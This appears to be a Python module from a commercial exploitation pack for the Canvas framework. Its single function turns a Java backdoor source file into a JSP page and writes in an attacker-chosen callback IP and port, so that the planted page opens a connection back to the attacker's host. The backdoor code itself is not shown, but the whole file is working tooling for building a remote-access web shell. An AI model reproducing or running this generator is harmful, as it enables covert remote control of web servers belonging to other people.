#! /usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2016
#

###
# STD Modules
###
import sys

###
# Canvas Modules
###
from exploitutils import *

###
# Convert javaNode.java to a .jsp file 
###
def d2_javatojsp(self, myip, myport, dstfile):
  self.log('[D2] Convert javaNode.java to %s with %s:%s callback parameters' % (dstfile, myip, myport))    
  inputLines = file("backdoors/javaNode.java").readlines()
  outfile = file(dstfile, "wb")
  outlines=[]
  outimports=[]
  outlines.append("<% \n")
  for line in inputLines:
    line = line.split("//")[0].strip()
    if line == "":
      continue

    if line[:len("import")]=="import":
      line = "<%%@ page import=\"%s\" %%>\n"%(line.split(" ")[1][:-1])
      outimports.append(line)
      continue
    if line.count("public static void main"):
      line = line.replace("public static void main","public void main")
    line = line.replace("127.0.0.1",myip)
    line = line.replace("5001",str(myport))
    line = line+"\n"
    outlines.append(line)
  outlines.append("""
    javaNode jstarter=new javaNode();
    jstarter.main();
    %>""")
  for line in outimports:
    outfile.write(line)
  for line in outlines:
    outfile.write(line)
  outfile.close()
  return
